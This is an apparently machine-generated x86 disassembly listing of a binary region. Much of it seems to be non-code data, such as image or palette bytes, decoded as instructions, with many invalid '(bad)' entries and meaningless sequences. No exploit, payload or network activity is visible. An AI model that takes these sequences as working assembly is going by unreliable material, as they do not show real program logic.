  406376:	mov    eax,DWORD PTR [eax]
  406378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406379:	popf   
  40637a:	pushf  
  40637b:	add    BYTE PTR [edi+ebx*4-0x5c52ff62],bh
  406382:	lahf   
  406383:	add    BYTE PTR [ebp-0x73ff695f],bh
  406389:	pushf  
  40638a:	mov    ds:0xa19d9500,eax
  40638f:	add    BYTE PTR [esi+ebx*4-0x4b69ff60],bl
  406396:	scas   al,BYTE PTR es:[edi]
  406397:	add    BYTE PTR [edi-0x5bff4851],dl
  40639d:	mov    ds:0xa6a800a3,eax
  4063a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063a3:	add    BYTE PTR [eax-0x5bff5359],ch
  4063a9:	stos   BYTE PTR es:[edi],al
  4063aa:	stos   DWORD PTR es:[edi],eax
  4063ab:	add    BYTE PTR [ebp-0x4eff5354],ch
  4063b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063b3:	add    BYTE PTR [edx-0x4eff5859],bh
  4063b9:	lods   eax,DWORD PTR ds:[esi]
  4063ba:	lods   al,BYTE PTR ds:[esi]
  4063bb:	add    BYTE PTR [edx-0x51ff5453],bh
  4063c1:	mov    al,0xae
  4063c3:	add    BYTE PTR [ecx-0x4eff5150],bh
  4063c9:	scas   eax,DWORD PTR es:[edi]
  4063ca:	mov    al,0x0
  4063cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063cd:	mov    ch,0xb6
  4063cf:	add    BYTE PTR [edx-0x52ff4b4f],ch
  4063d5:	mov    ebp,0xb3b400be
  4063da:	mov    bl,0x0
  4063dc:	mov    ebx,0xb600b4b7
  4063e1:	mov    edx,0xb6b000b7
  4063e6:	mov    edx,0xb9b5ba00
  4063eb:	add    BYTE PTR [ecx-0x43ff4346],dh
  4063f1:	mov    esp,0x89c700bc
  4063f6:	add    BYTE PTR [eax],0xc8
  4063f9:	xchg   esi,eax
  4063fa:	mov    es,WORD PTR [eax]
  4063fc:	loop   0x40638d
  4063fe:	add    BYTE PTR [eax],0xee
  406401:	cwde   
  406402:	xchg   DWORD PTR [eax],eax
  406404:	neg    BYTE PTR [ebx-0x5606ff77]
  40640a:	cdq    
  40640b:	add    ch,bh
  40640d:	mov    ah,0x9c
  40640f:	add    ah,al
  406411:	scas   al,BYTE PTR es:[edi]
  406412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406413:	add    bh,al
  406415:	lods   al,BYTE PTR ds:[esi]
  406416:	stos   BYTE PTR es:[edi],al
  406417:	add    ch,dl
  406419:	lods   eax,DWORD PTR ds:[esi]
  40641a:	mov    ds:0xabb3c400,eax
  40641f:	add    ah,dl
  406421:	mov    cl,0xa7
  406423:	add    al,dl
  406425:	mov    bl,0xad
  406427:	add    ch,al
  406429:	mov    bh,0xb5
  40642b:	add    bl,cl
  40642d:	mov    esp,0xb4cc00b6
  406432:	mov    esi,0xbbbac000
  406437:	add    al,cl
  406439:	mov    ebp,0xb7e300bc
  40643e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40643f:	add    dl,bh
  406441:	mov    eax,0xbfed00a8
  406446:	mov    bh,0x0
  406448:	test   edx,0xc4e200ac
  40644e:	mov    esp,0xb5c7fb00
  406453:	add    BYTE PTR [esi-0x20ff3b41],dh
  406459:	test   al,0xc4
  40645b:	add    BYTE PTR [ebp-0x4eff3237],ch
  406461:	ret    0xc7
  406464:	mov    esi,0xb700c0c0
  406469:	(bad)  
  40646a:	retf   
  40646b:	add    BYTE PTR [ebp-0x46ff373a],bh
  406471:	retf   0xcc
  406474:	mov    dh,0xcc
  406476:	rol    BYTE PTR [eax],cl
  406478:	mov    edx,0xbe00d2ce
  40647d:	rcl    bl,1
  40647f:	add    BYTE PTR [edx-0x43ff272f],bh
  406485:	loopne 0x40646c
  406487:	add    ah,al
  406489:	(bad)  
  40648a:	les    eax,FWORD PTR [eax]
  40648c:	retf   0xc5c4
  40648f:	add    ah,al
  406491:	(bad)  
  406492:	leave  
  406493:	add    ch,al
  406495:	retf   
  406496:	retf   0xcb00
  406499:	int3   
  40649a:	int3   
  40649b:	add    ch,dl
  40649d:	mov    bl,0x0
  4064a0:	ror    esp,cl
  4064a2:	int3   
  4064a3:	add    ch,cl
  4064a5:	ror    dh,1
  4064a7:	add    bl,al
  4064a9:	iret   
  4064aa:	rol    BYTE PTR [eax],cl
  4064ac:	fadd   st,st(4)
  4064ae:	rol    BYTE PTR [eax],1
  4064b0:	ret    0xd5d1
  4064b3:	add    cl,cl
  4064b5:	rcl    bl,1
  4064b7:	add    dl,al
  4064b9:	aam    0xdb
  4064bb:	add    bl,cl
  4064bd:	xlat   BYTE PTR ds:[ebx]
  4064be:	fild   DWORD PTR [eax]
  4064c0:	ret    
  4064c1:	(bad)  
  4064c3:	add    ch,cl
  4064c5:	(bad)  
  4064c7:	add    bl,dl
  4064c9:	rcl    ebx,cl
  4064cb:	add    dl,bl
  4064cd:	aam    0xd4
  4064cf:	add    dh,bl
  4064d1:	(bad)  
  4064d2:	fadd   DWORD PTR [eax]
  4064d4:	xlat   BYTE PTR ds:[ebx]
  4064d5:	fcmovu st,st(1)
  4064d7:	add    bl,bl
  4064d9:	(bad)  
  4064db:	add    bl,ah
  4064dd:	int3   
  4064de:	les    eax,FWORD PTR [eax]
  4064e0:	cld    
  4064e1:	fmul   st,st(1)
  4064e3:	add    bh,ah
  4064e5:	fstp   st(0)
  4064e7:	add    dh,bh
  4064e9:	fst    st(3)
  4064eb:	add    dh,ch
  4064ed:	loop   0x4064c9
  4064ef:	add    dh,bh
  4064f1:	jecxz  0x4064ca
  4064f3:	add    cl,dl
  4064f5:	fsubrp st(1),st
  4064f7:	add    bl,al
  4064f9:	loopne 0x4064df
  4064fb:	add    bl,cl
  4064fd:	in     al,0xe5
  4064ff:	add    dh,al
  406501:	out    0xea,al
  406503:	add    dl,cl
  406505:	out    0xeb,al
  406507:	add    dh,al
  406509:	jmp    0xea0f65fb
  40650e:	in     al,dx
  40650f:	add    cl,dl
  406511:	loope  0x4064f7
  406513:	add    dl,bl
  406515:	in     al,0xe6
  406517:	add    bl,bl
  406519:	in     eax,0xe8
  40651b:	add    ah,bl
  40651d:	in     al,dx
  40651e:	in     eax,dx
  40651f:	add    ah,al
  406521:	jmp    0x406515
  406523:	add    ah,dl
  406525:	out    dx,al
  406526:	hlt    
  406527:	add    ah,bl
  406529:	sti    
  40652a:	std    
  40652b:	add    cl,ah
  40652d:	loope  0x406510
  40652f:	add    cl,ch
  406531:	in     eax,0xe4
  406533:	add    al,ah
  406535:	call   0xec2c6624
  40653a:	jmp    0xff00:0xe5e9f900
  406541:	icebp  
  406542:	in     eax,dx
  406543:	add    ch,dh
  406545:	div    ch
  406547:	add    bh,bh
  406549:	clc    
  40654a:	test   BYTE PTR [eax],0xf5
  40654d:	idiv   cl
  40654f:	add    dh,bh
  406551:	(bad)  
  406552:	inc    BYTE PTR [eax]
  406554:	(bad)  
  406555:	(bad)  
  406556:	inc    DWORD PTR [eax]
	...
  4065a8:	add    ah,bl
  4065aa:	(bad)  
  4065ac:	iret   
  4065ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4065c6:	add    bh,cl
  4065c8:	fnstsw ax
  4065ca:	cmc    
  4065cb:	loopne 0x4065ac
  4065cd:	loopne 0x40659c
  4065cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4065e4:	add    BYTE PTR [edx-0xa1f2120],ah
  4065ea:	cmc    
  4065eb:	rcl    ebx,cl
  4065ed:	clc    
  4065ee:	iret   
  4065ef:	rcr    esp,cl
  4065f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  406602:	add    BYTE PTR [eax],al
  406604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406605:	fmul   st(5),st
  406607:	into   
  406608:	fdivr  st(5),st
  40660a:	cmc    
  40660b:	(bad)  
  40660d:	loopne 0x4065c6
  40660f:	int    0xa2
  406611:	int    0x9a
	...
  406623:	add    BYTE PTR [esi-0x2332595e],ah
  406629:	loopne 0x40660b
  40662b:	ror    ebp,cl
  40662d:	iret   
  40662e:	int    0xa6
  406630:	cmp    DWORD PTR [eax-0x31],0x0
	...
  406644:	iret   
  406645:	rol    ebx,cl
  406647:	ret    
  406648:	int    0xd3
  40664a:	(bad)  
  40664c:	int    0xc3
  40664e:	xchg   ecx,eax
  40664f:	jbe    0x4066c7
  406651:	add    DWORD PTR [ebx+0x0],0x0
  406658:	add    BYTE PTR [eax],al
  40665a:	adc    dh,BYTE PTR [edi+0x7f]
	...
  406665:	mov    ds:0x9ca4cfd3,al
  40666a:	cwde   
  40666b:	xor    DWORD PTR [esi+0xe],0xb
  40666f:	or     eax,0x9c95a27f
  406674:	int    0x0
  406676:	add    BYTE PTR [eax],al
  406678:	add    BYTE PTR [ebx-0x7c1f5d7d],al
  40667e:	or     cl,BYTE PTR [esi]
  406680:	xchg   ecx,eax
  406681:	add    DWORD PTR [eax],0x0
  406684:	add    BYTE PTR [eax],al
  406686:	add    BYTE PTR [eax+0x10108391],al
  40668c:	adc    BYTE PTR [esi-0x72],dh
  40668f:	call   0x95dc:0xefedd8c4
  406696:	add    BYTE PTR [eax],al
  406698:	add    BYTE PTR [edi-0x5c],bh
  40669b:	js     0x406632
  40669d:	fmul   st(5),st
  40669f:	xor    BYTE PTR [esi+0x7f],0x95
  4066a3:	jg     0x4066a5
  4066a5:	add    BYTE PTR [eax],al
  4066a7:	add    BYTE PTR [ebp-0x6f738186],dl
  4066ad:	fsubr  st,st(0)
  4066af:	out    dx,al
  4066b0:	fdiv   QWORD PTR [edx-0x3c3a4a95]
  4066b6:	add    BYTE PTR [eax],al
  4066b8:	add    BYTE PTR [eax-0x6a6a775a],al
  4066be:	xchg   ebp,eax
  4066bf:	iret   
  4066c0:	loopne 0x406645
  4066c2:	or     eax,0xc28d1076
  4066c7:	mov    ecx,0xafb4c5c1
  4066cd:	test   al,0x64
  4066cf:	xor    DWORD PTR [eax],esp
  4066d1:	pop    ds
  4066d2:	pop    ss
  4066d3:	test   eax,ebp
  4066d5:	mov    ds:0x83000000,al
  4066da:	int    0x91
  4066dc:	call   0xc88f:0x727b7f91
  4066e3:	repz hlt 
  4066e5:	out    dx,al
  4066e6:	int    0x89
  4066e8:	pusha  
  4066e9:	push   edi
  4066ea:	cmp    eax,0x1f1f1721
  4066ef:	and    DWORD PTR [edi],esp
  4066f1:	xor    BYTE PTR [eax],ch
  4066f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066f4:	jmp    0xd383:0x91
  4066fb:	mov    bl,BYTE PTR [edx-0x626a806d]
  406701:	into   
  406702:	xchg   edi,eax
  406703:	pop    edi
  406704:	push   esi
  406705:	aaa    
  406706:	sbb    al,0x13
  406708:	adc    edx,DWORD PTR [ebx]
  40670a:	adc    al,0x17
  40670c:	xor    bh,BYTE PTR [ebx]
  40670e:	cmp    al,0x3c
  406710:	dec    edx
  406711:	dec    edx
  406712:	inc    esi
  406713:	imul   ebp,esp,0x8a
  406719:	mov    ch,bl
  40671b:	xchg   ecx,eax
  40671c:	call   0x151d:0x4fd68395
  406723:	add    al,BYTE PTR [ecx]
  406725:	add    DWORD PTR [edx],eax
  406727:	adc    al,0x4
  406729:	pop    es
  40672a:	sbb    esp,DWORD PTR [esi]
  40672c:	dec    esp
  40672d:	dec    esp
  40672e:	dec    esp
  40672f:	dec    ebp
  406730:	dec    ebp
  406731:	popa   
  406732:	dec    ebx
  406733:	gs in  al,dx
  406735:	xchg   ebx,eax
  406736:	add    BYTE PTR [eax],al
  406738:	add    BYTE PTR [ebx-0x636a6c22],al
  40673e:	mov    gs,eax
  406740:	xor    eax,DWORD PTR [edx]
  406742:	sbb    al,0x19
  406744:	sbb    DWORD PTR [ecx],ebx
  406746:	sbb    DWORD PTR ds:0x2c03a296,eax
  40674c:	gs gs gs data16 bound sp,DWORD PTR gs:[esi-0x12]
  406755:	xchg   esp,eax
  406756:	add    BYTE PTR [eax],al
  406758:	add    BYTE PTR [esi-0x5b637721],cl
  40675e:	xchg   ecx,eax
  40675f:	aam    0x51
  406761:	sbb    al,0x35
  406763:	cs sbb al,BYTE PTR cs:[ebx]
  406767:	mov    ah,0xe0
  406769:	int    0x79
  40676b:	das    
  40676c:	push   0x6a
  40676e:	ins    BYTE PTR es:[edi],dx
  40676f:	ins    BYTE PTR es:[edi],dx
  406770:	ins    BYTE PTR es:[edi],dx
  406771:	ins    BYTE PTR es:[edi],dx
  406772:	addr16 addr16 out 0x9a,eax
  406776:	add    BYTE PTR [eax],al
  406778:	add    BYTE PTR [eax-0x3c65772d],cl
  40677e:	mov    ds:0x38195bd4,al
  406783:	cmp    BYTE PTR ds:0x58fbd208,dh
  406789:	xchg   ebp,esi
  40678b:	push   ecx
  40678c:	test   eax,0x6f6f6f6f
  406791:	jo     0x406803
  406793:	ins    DWORD PTR es:[edi],dx
  406794:	fcomp  QWORD PTR [edi-0x7d000000]
  40679a:	mov    dh,0x79
  40679c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40679d:	iret   
  40679e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40679f:	into   
  4067a0:	sub    BYTE PTR [esi],0x53
  4067a3:	push   ebp
  4067a4:	push   ebx
  4067a5:	sar    ecx,cl
  4067a7:	push   eax
  4067a8:	sub    DWORD PTR [edx],edi
  4067aa:	cmc    
  4067ab:	fstp   QWORD PTR [esi-0x56]
  4067ae:	stos   BYTE PTR es:[edi],al
  4067af:	stos   BYTE PTR es:[edi],al
  4067b0:	stos   DWORD PTR es:[edi],eax
  4067b1:	lods   al,BYTE PTR ds:[esi]
  4067b2:	lods   al,BYTE PTR ds:[esi]
  4067b3:	jo     0x406772
  4067b5:	mov    DWORD PTR [eax],0x967c0000
  4067bb:	jle    0x406774
  4067bd:	rol    ebx,cl
  4067bf:	into   
  4067c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067c1:	xor    edx,DWORD PTR [ebp+0x57]
  4067c4:	push   ds
  4067c5:	push   esp
  4067c6:	xor    eax,0x5c2a2826
  4067cb:	call   FWORD PTR [ebx-0x52535392]
  4067d1:	lods   eax,DWORD PTR ds:[esi]
  4067d2:	lods   eax,DWORD PTR ds:[esi]
  4067d3:	jo     0x406790
  4067d5:	fmul   st,st(5)
  4067d7:	add    BYTE PTR [eax],al
  4067d9:	jge    0x40684f
  4067db:	jne    0x40679d
  4067dd:	fmul   st(5),st
  4067df:	into   
  4067e0:	lds    esi,FWORD PTR [edi]
  4067e2:	pop    esp
  4067e3:	push   ebp
  4067e4:	push   ss
  4067e5:	and    al,0x25
  4067e7:	sub    DWORD PTR [edx],ebp
  4067e9:	inc    esp
  4067ea:	inc    esi
  4067eb:	sar    edi,1
  4067ed:	test   BYTE PTR [edx-0x41454546],bh
  4067f3:	lods   eax,DWORD PTR ds:[esi]
  4067f4:	mov    ebx,0x95d6
  4067f9:	jae    0x406804
  4067fb:	pmullw mm3,mm7
  4067fe:	into   
  4067ff:	ror    eax,cl
  406801:	ss pop ebp
  406803:	cmp    DWORD PTR [edi],edx
  406805:	sub    al,BYTE PTR es:[ebp+eax*2+0x43]
  40680a:	inc    edi
  40680b:	mov    al,0xe0
  40680d:	cmc    
  40680e:	test   BYTE PTR [esi-0x411d1d1e],bh
  406814:	mov    esp,0x8ed6
  406819:	jno    0x406821
  40681b:	or     al,0xce
  40681d:	(bad)  
  40681f:	ror    ecx,cl
  406821:	dec    ecx
  406822:	pop    ecx
  406823:	sbb    BYTE PTR ds:0x45442a28,ah
  406829:	inc    ecx
  40682a:	dec    esi
  40682b:	out    0xaf,al
  40682d:	loopne 0x4067d5
  40682f:	mov    esp,edx
  406831:	loop   0x406815
  406833:	loop   0x4067f1
  406835:	fild   DWORD PTR [edx+0x10b70000]
  40683b:	xchg   ebp,eax
  40683c:	std    
  40683d:	(bad)  
  40683e:	out    dx,eax
  40683f:	(bad)  
  406841:	push   edx
  406842:	das    
  406843:	pop    ss
  406844:	sub    BYTE PTR [edx],ch
  406846:	inc    esp
  406847:	inc    esp
  406848:	inc    edi
  406849:	inc    edx
  40684a:	push   0xdcb1e2fb
  40684f:	mov    ch,BYTE PTR [edi-0x411b191c]
  406855:	loopne 0x4067e5
  406857:	add    BYTE PTR [eax],al
  406859:	add    BYTE PTR [eax],al
  40685b:	ret    
  40685c:	mov    ds:0xe7ffffdf,al
  406861:	push   edx
  406862:	adc    al,0x24
  406864:	sub    BYTE PTR [edx],ch
  406866:	inc    esp
  406867:	inc    ebp
  406868:	inc    edi
  406869:	inc    edx
  40686a:	lods   eax,DWORD PTR ds:[esi]
  40686b:	sti    
  40686c:	in     al,0xe3
  40686e:	cwde   
  40686f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406870:	mov    bh,cl
  406872:	cli    
  406873:	cli    
  406874:	loop   0x40686c
  406876:	xchg   esp,eax
  406877:	add    BYTE PTR [eax],al
  406879:	add    BYTE PTR [eax],al
  40687b:	add    BYTE PTR [eax],al
  40687d:	add    BYTE PTR [edx+0x145ad4a2],ah
  406883:	and    eax,0x45442a29
  406888:	inc    edi
  406889:	dec    eax
  40688a:	in     al,0xff
  40688c:	cli    
  40688d:	stc    
  40688e:	in     eax,0xe5
  406890:	jecxz  0x406876
  406892:	out    0xe2,al
  406894:	lods   eax,DWORD PTR ds:[esi]
  406895:	stc    
  406896:	lahf   
	...
  40689f:	add    bh,cl
  4068a1:	mov    BYTE PTR [esi],dl
  4068a3:	and    ah,BYTE PTR [ebx]
  4068a5:	ds aas 
  4068a7:	inc    ecx
  4068a8:	inc    ecx
  4068a9:	dec    eax
  4068aa:	in     al,0xe2
  4068ac:	mov    esi,0xbabcbcbe
  4068b1:	mov    ecx,0xfbe1bdb9
  4068b6:	iret   
	...
  4068bf:	add    BYTE PTR [eax],al
  4068c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068c2:	adc    ebx,DWORD PTR [edi]
  4068c4:	and    ebp,DWORD PTR [ebx]
  4068c6:	xor    DWORD PTR [ecx+eiz*2+0x6a],ecx
  4068ca:	mov    al,0xb3
  4068cc:	mov    bl,0xb8
  4068ce:	iret   
  4068cf:	rcl    ebx,cl
  4068d1:	fucomi st,st(6)
  4068d3:	div    ecx
  4068d5:	test   BYTE PTR [eax],0x0
	...
  4068e0:	add    BYTE PTR [edi-0x596679a6],bh
  4068e6:	(bad)  
  4068e7:	retf   
  4068e8:	in     al,dx
  4068e9:	repnz out dx,al
  4068eb:	out    dx,eax
  4068ec:	test   DWORD PTR [eax],0x0
	...
  4068fe:	add    BYTE PTR [eax],al
  406900:	add    ah,bl
  406902:	icebp  
  406903:	icebp  
	...
  406958:	(bad)  
  406959:	(bad)  
  40695a:	(bad)  
  40695b:	(bad)  
  40695c:	(bad)  
  40695d:	(bad)  
  40695e:	(bad)  
  40695f:	(bad)  
  406960:	(bad)  
  406961:	inc    DWORD PTR [ebx+0xfeffff]
  406967:	(bad)  
  406968:	(bad)  
  406969:	clc    
  40696a:	add    BYTE PTR [edi],bh
  40696c:	push   eax
  40696e:	add    BYTE PTR [edi],bl
  406970:	push   eax
  406972:	add    BYTE PTR [edi],bl
  406974:	push   eax
  406976:	add    BYTE PTR [edi],bl
  406978:	xbegin 0x3ec0707e
  40697e:	add    BYTE PTR [ebx],al
  406980:	or     BYTE PTR [edi],0x0
  406983:	add    eax,DWORD PTR [eax-0x7ffd0000]
  406989:	add    BYTE PTR [eax],al
  40698b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  406991:	add    BYTE PTR [eax],al
  406993:	add    eax,DWORD PTR [eax-0x7ffd0000]
  406999:	add    BYTE PTR [eax],al
  40699b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  4069a1:	add    BYTE PTR [eax],al
  4069a3:	add    eax,DWORD PTR [eax-0x7fff0000]
  4069a9:	add    BYTE PTR [eax],al
  4069ab:	add    DWORD PTR [eax-0x7fff0000],eax
  4069b1:	add    BYTE PTR [eax],al
  4069b3:	add    DWORD PTR [eax-0x1fff0000],eax
  4069b9:	add    BYTE PTR [eax],al
  4069bb:	add    esp,edi
  4069bd:	add    BYTE PTR [eax],al
  4069bf:	add    edi,edi
  4069c1:	add    BYTE PTR [eax],al
  4069c3:	add    edi,edi
  4069c5:	add    BYTE PTR [eax],0x3
  4069c8:	inc    DWORD PTR [eax-0x700000f9]
  4069ce:	(bad)  
  4069cf:	(bad)  
  4069d0:	(bad)  
  4069d1:	(bad)  
  4069d2:	(bad)  
  4069d3:	(bad)  
  4069d4:	(bad)  
  4069d5:	(bad)  
  4069d6:	(bad)  
  4069d7:	jmp    FWORD PTR [eax]
  4069d9:	add    BYTE PTR [eax],al
  4069db:	add    BYTE PTR [eax],dl
  4069dd:	add    BYTE PTR [eax],al
  4069df:	add    BYTE PTR [eax],ah
  4069e1:	add    BYTE PTR [eax],al
  4069e3:	add    BYTE PTR [ecx],al
  4069e5:	add    BYTE PTR [eax],cl
  4069e7:	add    BYTE PTR [eax],al
  4069e9:	add    BYTE PTR [eax],al
  4069eb:	add    BYTE PTR [eax],al
  4069ed:	add    DWORD PTR [eax],eax
	...
  4069f7:	add    BYTE PTR [eax],al
  4069f9:	add    DWORD PTR [eax],eax
  4069fb:	add    BYTE PTR [eax],al
  4069fd:	add    DWORD PTR [eax],eax
  4069ff:	add    BYTE PTR [eax],al
  406a01:	add    BYTE PTR [eax],al
  406a03:	add    BYTE PTR [eax+0x44],cl
  406a06:	inc    ebx
  406a07:	add    BYTE PTR [ebx+0x79],bh
  406a0a:	jns    0x406a0c
  406a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a0d:	(bad)  
  406a0e:	verw   WORD PTR [eax-0x54fff1f2]
  406a15:	adc    ecx,DWORD PTR ds:0xc1db900
  406a1b:	add    BYTE PTR [ecx-0x4dffdfe0],ch
  406a21:	sub    al,0x23
  406a23:	add    BYTE PTR [edi+ebp*1+0x2fbc0022],dh
  406a2a:	and    al,0x0
  406a2c:	mov    bl,0x31
  406a2e:	and    al,BYTE PTR [eax]
  406a30:	mov    ah,0x3f
  406a32:	das    
  406a33:	add    dl,cl
  406a35:	add    al,0x4
  406a37:	add    ah,bl
  406a39:	sldt   WORD PTR [eax]
  406a3c:	lds    ebx,FWORD PTR [eax]
  406a3e:	pop    es
  406a3f:	add    ch,al
  406a41:	sbb    al,0x9
  406a43:	add    ah,dl
  406a45:	sbb    DWORD PTR [ecx],eax
  406a47:	add    ah,dl
  406a49:	sbb    eax,0x1ad80001
  406a4e:	add    BYTE PTR [eax],al
  406a50:	fstp   DWORD PTR ds:0x12e80000
  406a56:	add    BYTE PTR [eax],al
  406a58:	out    0x1b,al
  406a5a:	add    BYTE PTR [eax],al
  406a5c:	in     eax,dx
  406a5d:	sbb    al,BYTE PTR [eax]
  406a5f:	add    bh,dh
  406a61:	push   ss
  406a62:	add    BYTE PTR [eax],al
  406a64:	retf   
  406a65:	and    eax,0x3bdd0003
  406a6a:	adc    BYTE PTR [eax],al
  406a6c:	jecxz  0x406a94
  406a6e:	add    BYTE PTR [eax],al
  406a70:	mov    ah,0x40
  406a72:	xor    eax,0x3a43b800
  406a77:	add    dh,bl
  406a79:	inc    eax
  406a7a:	and    eax,0x2c47d700
  406a7f:	add    dh,bl
  406a81:	dec    edi
  406a82:	sub    eax,0x3441c000
  406a87:	add    bl,bl
  406a89:	pop    eax
  406a8a:	cmp    eax,DWORD PTR [eax]
  406a8c:	jecxz  0x406ad2
  406a8e:	daa    
  406a8f:	add    bh,bh
  406a91:	pop    ecx
  406a92:	ss add bh,bh
  406a95:	xor    DWORD PTR gs:[eax],eax
  406a98:	jmp    FWORD PTR [edx+0x3d]
  406a9b:	add    bh,bh
  406a9d:	jg     0x406adb
  406a9f:	add    ch,bl
  406aa1:	pop    esp
  406aa2:	inc    ecx
  406aa3:	add    dl,bl
  406aa5:	bound  ecx,QWORD PTR [eax+0x0]
  406aa8:	fbstp  TBYTE PTR [ebx+0x43]
  406aab:	add    dh,dl
  406aad:	push   0x53
  406aaf:	add    ch,dl
  406ab1:	ins    BYTE PTR es:[edi],dx
  406ab2:	pop    ecx
  406ab3:	add    bh,bh
  406ab5:	imul   ecx,DWORD PTR [eax+0x0],0xffffffff
  406ab9:	jo     0x406b06
  406abb:	add    ah,cl
  406abd:	jno    0x406b22
  406abf:	add    BYTE PTR [eax],al
  406ac1:	repnz dec eax
  406ac3:	add    dl,bl
  406ac5:	adc    DWORD PTR [ecx+0x0],0x5983d7
  406acc:	(bad)  
  406acd:	sbb    BYTE PTR [eax+eax*1-0x2c],0x82
  406ad2:	jne    0x406ad4
  406ad4:	(bad)  
  406ad6:	add    BYTE PTR [eax],0x8a
  406ad9:	mov    cl,BYTE PTR [edx-0x6f6f6f00]
  406adf:	add    BYTE PTR [esp+edx*4-0x6364ff6c],dl
  406ae6:	pushf  
  406ae7:	add    BYTE PTR [esi-0x4cff6162],bl
  406aed:	lea    eax,[edi-0x5f5f6100]
  406af3:	add    BYTE PTR [ecx-0x5fff5a41],bl
  406af9:	mov    al,ds:0xa4a400a0
  406afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406aff:	add    BYTE PTR [edx-0x54ff5556],ch
  406b05:	lods   al,BYTE PTR ds:[esi]
  406b06:	lods   al,BYTE PTR ds:[esi]
  406b07:	add    BYTE PTR [ebp-0x4fff5253],ch
  406b0d:	mov    cl,0xb1
  406b0f:	add    BYTE PTR [ebp+esi*4-0x4647ff4b],dh
  406b16:	mov    ecx,0xbcbcbb00
  406b1b:	add    BYTE PTR [esi-0xcff4142],bh
  406b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b22:	nop
  406b23:	add    al,al
  406b25:	mov    edx,0xc0c000b8
  406b2a:	rol    BYTE PTR [eax],0xc4
  406b2d:	mov    dh,0x0
  406b30:	leave  
  406b31:	(bad)
  406b34:	(bad)
  406b37:	add    al,cl
  406b39:	retf   0xca
  406b3c:	leave  
  406b3d:	retf   
  406b3e:	int3   
  406b3f:	add    dl,cl
  406b41:	int3   
  406b42:	int3   
  406b43:	add    ah,cl
  406b45:	into   
  406b46:	into   
  406b47:	add    ah,bl
  406b49:	retf   0xc9
  406b4c:	into   
  406b4d:	rcl    al,1
  406b4f:	add    al,dl
  406b51:	rcl    edx,1
  406b53:	add    dh,dl
  406b55:	(bad)  
  406b56:	aad    0x0
  406b58:	(bad)  
  406b5a:	fld    DWORD PTR [eax]
  406b5c:	(bad)  
  406b5e:	fild   WORD PTR [eax]
  406b60:	loope  0x406b43
  406b62:	loope  0x406b64
  406b64:	call   0xee415451
  406b69:	out    dx,al
  406b6a:	out    dx,al
  406b6b:	add    al,bh
  406b6d:	clc    
  406b6e:	clc    
	...
  406dfb:	add    bh,bh
  406dfd:	(bad)  
  406dfe:	inc    DWORD PTR [eax]
	...
  406e10:	aaa    
  406e11:	add    dh,BYTE PTR [edi]
  406e13:	add    BYTE PTR [eax],al
  406e15:	add    BYTE PTR [esi+0x46],al
  406e18:	inc    esp
  406e19:	cmp    DWORD PTR [ecx],edi
  406e1b:	cmp    al,0x3e
  406e1d:	add    BYTE PTR [eax],al
  406e1f:	add    BYTE PTR [edx+0x37],cl
  406e22:	inc    esp
  406e23:	add    BYTE PTR [eax],al
  406e25:	add    BYTE PTR [ecx+0x4e],bl
  406e28:	dec    edx
  406e29:	inc    esi
  406e2a:	inc    eax
  406e2b:	add    BYTE PTR ds:[eax],al
  406e2e:	add    BYTE PTR [eax],al
  406e30:	inc    eax
  406e31:	dec    edx
  406e32:	add    BYTE PTR ds:[eax],al
  406e35:	add    BYTE PTR [eax],al
  406e37:	add    BYTE PTR [esi+0x36],al
  406e3a:	cmp    DWORD PTR [eax],eax
  406e3c:	add    BYTE PTR [eax],al
  406e3e:	add    BYTE PTR [eax],al
  406e40:	inc    esp
  406e41:	push   esp
  406e42:	inc    eax
  406e43:	pop    eax
  406e44:	dec    edx
  406e45:	inc    esi
  406e46:	inc    esi
  406e47:	inc    esi
  406e48:	inc    esp
  406e49:	inc    eax
  406e4a:	inc    eax
  406e4b:	ds ds ds ds dec esi
  406e50:	inc    eax
  406e51:	push   esp
  406e52:	inc    eax
  406e53:	push   ebx
  406e54:	push   ebx
  406e55:	push   ebx
  406e56:	dec    esi
  406e57:	dec    esi
  406e58:	dec    esi
  406e59:	dec    esi
  406e5a:	dec    esi
  406e5b:	dec    esi
  406e5c:	dec    esi
  406e5d:	dec    esi
  406e5e:	dec    esi
  406e5f:	cmp    DWORD PTR [esp+edx*2+0x40],eax
  406e63:	push   ebx
  406e64:	inc    eax
  406e65:	add    eax,DWORD PTR [ebx]
  406e67:	add    eax,DWORD PTR [edi]
  406e69:	or     al,0x12
  406e6b:	adc    dl,BYTE PTR [ecx+ebx*1]
  406e6e:	dec    edx
  406e6f:	ds inc ebx
  406e71:	push   esp
  406e72:	inc    eax
  406e73:	push   esp
  406e74:	inc    eax
  406e75:	or     DWORD PTR [ecx],ecx
  406e77:	push   es
  406e78:	dec    esp
  406e79:	das    
  406e7a:	pop    ds
  406e7b:	push   ds
  406e7c:	and    ebx,DWORD PTR [edx]
  406e7e:	dec    esi
  406e7f:	ds cmp eax,0x40543530
  406e85:	sbb    al,0x9
  406e87:	push   esi
  406e88:	pop    ecx
  406e89:	pop    ebx
  406e8a:	cmp    esp,DWORD PTR [edx]
  406e8c:	sub    BYTE PTR [eax],ah
  406e8e:	dec    esi
